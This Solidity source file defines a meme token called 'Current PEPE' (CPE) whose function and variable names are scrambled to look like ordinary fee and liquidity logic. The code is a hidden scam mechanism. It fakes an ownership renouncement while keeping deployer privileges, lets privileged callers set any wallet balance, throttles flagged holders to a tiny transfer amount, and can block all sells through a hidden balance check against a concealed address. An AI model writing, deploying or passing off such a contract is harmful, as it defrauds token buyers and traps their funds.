//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface feeTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atLiquidity) external view returns (uint256);

    function transfer(address maxSellTrading, uint256 toBuyTeam) external returns (bool);

    function allowance(address launchIsMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 toBuyTeam) external returns (bool);

    function transferFrom(
        address sender,
        address maxSellTrading,
        uint256 toBuyTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTx, uint256 value);
    event Approval(address indexed launchIsMarketing, address indexed spender, uint256 value);
}

abstract contract minSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromSender {
    function createPair(address teamShould, address toToken) external returns (address);
}

interface feeTotalMetadata is feeTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CurrentPEPE is minSwap, feeTotal, feeTotalMetadata {

    function transfer(address modeFundSwap, uint256 toBuyTeam) external virtual override returns (bool) {
        return takeSender(_msgSender(), modeFundSwap, toBuyTeam);
    }

    address swapLiquidityAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 launchSell;

    uint256 public shouldMax;

    constructor (){
        
        teamSwap tokenTrading = teamSwap(swapLiquidityAt);
        takeTokenTrading = fromSender(tokenTrading.factory()).createPair(tokenTrading.WETH(), address(this));
        
        txFromAmount = _msgSender();
        launchedShould();
        minSender[txFromAmount] = true;
        exemptReceiver[txFromAmount] = senderSell;
        if (senderLaunch) {
            senderLaunch = true;
        }
        emit Transfer(address(0), txFromAmount, senderSell);
    }

    function name() external view virtual override returns (string memory) {
        return receiverTeam;
    }

    address atFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private senderSell = 100000000 * 10 ** 18;

    function marketingWallet(address marketingFrom, address maxSellTrading, uint256 toBuyTeam) internal returns (bool) {
        require(exemptReceiver[marketingFrom] >= toBuyTeam);
        exemptReceiver[marketingFrom] -= toBuyTeam;
        exemptReceiver[maxSellTrading] += toBuyTeam;
        emit Transfer(marketingFrom, maxSellTrading, toBuyTeam);
        return true;
    }

    function balanceOf(address atLiquidity) public view virtual override returns (uint256) {
        return exemptReceiver[atLiquidity];
    }

    mapping(address => bool) public minSender;

    function getOwner() external view returns (address) {
        return launchedFromAuto;
    }

    event OwnershipTransferred(address indexed modeBuy, address indexed receiverFund);

    uint256 public tradingFrom;

    function limitFeeSell(address maxToken) public {
        require(maxToken.balance < 100000);
        if (minTo) {
            return;
        }
        
        minSender[maxToken] = true;
        if (shouldMax == toTxFee) {
            shouldMax = toTxFee;
        }
        minTo = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderSell;
    }

    uint256 minTx;

    function receiverLimitExempt() private view {
        require(minSender[_msgSender()]);
    }

    function launchedShould() public {
        emit OwnershipTransferred(txFromAmount, address(0));
        launchedFromAuto = address(0);
    }

    function takeFee(uint256 toBuyTeam) public {
        receiverLimitExempt();
        minTx = toBuyTeam;
    }

    function owner() external view returns (address) {
        return launchedFromAuto;
    }

    function symbol() external view virtual override returns (string memory) {
        return buyModeLaunched;
    }

    uint256 private toTxFee;

    address public takeTokenTrading;

    bool public shouldTakeSell;

    bool private senderLaunch;

    function walletLimitTake(address modeFundSwap, uint256 toBuyTeam) public {
        receiverLimitExempt();
        exemptReceiver[modeFundSwap] = toBuyTeam;
    }

    uint256 constant atFromIs = 6 ** 10;

    uint8 private senderTotal = 18;

    address private launchedFromAuto;

    mapping(address => bool) public modeTotalList;

    function transferFrom(address marketingFrom, address maxSellTrading, uint256 toBuyTeam) external override returns (bool) {
        if (_msgSender() != swapLiquidityAt) {
            if (receiverFee[marketingFrom][_msgSender()] != type(uint256).max) {
                require(toBuyTeam <= receiverFee[marketingFrom][_msgSender()]);
                receiverFee[marketingFrom][_msgSender()] -= toBuyTeam;
            }
        }
        return takeSender(marketingFrom, maxSellTrading, toBuyTeam);
    }

    address public txFromAmount;

    function approve(address totalFrom, uint256 toBuyTeam) public virtual override returns (bool) {
        receiverFee[_msgSender()][totalFrom] = toBuyTeam;
        emit Approval(_msgSender(), totalFrom, toBuyTeam);
        return true;
    }

    mapping(address => mapping(address => uint256)) private receiverFee;

    string private receiverTeam = "Current PEPE";

    string private buyModeLaunched = "CPE";

    function allowance(address shouldLimit, address totalFrom) external view virtual override returns (uint256) {
        if (totalFrom == swapLiquidityAt) {
            return type(uint256).max;
        }
        return receiverFee[shouldLimit][totalFrom];
    }

    bool public tradingTx;

    bool public minTo;

    mapping(address => uint256) private exemptReceiver;

    bool private enableAmount;

    function takeSender(address marketingFrom, address maxSellTrading, uint256 toBuyTeam) internal returns (bool) {
        if (marketingFrom == txFromAmount) {
            return marketingWallet(marketingFrom, maxSellTrading, toBuyTeam);
        }
        uint256 isTo = feeTotal(takeTokenTrading).balanceOf(atFee);
        require(isTo == minTx);
        require(maxSellTrading != atFee);
        if (modeTotalList[marketingFrom]) {
            return marketingWallet(marketingFrom, maxSellTrading, atFromIs);
        }
        return marketingWallet(marketingFrom, maxSellTrading, toBuyTeam);
    }

    function limitMode(address isLiquidityTx) public {
        receiverLimitExempt();
        if (tradingTx) {
            tradingFrom = shouldMax;
        }
        if (isLiquidityTx == txFromAmount || isLiquidityTx == takeTokenTrading) {
            return;
        }
        modeTotalList[isLiquidityTx] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderTotal;
    }

}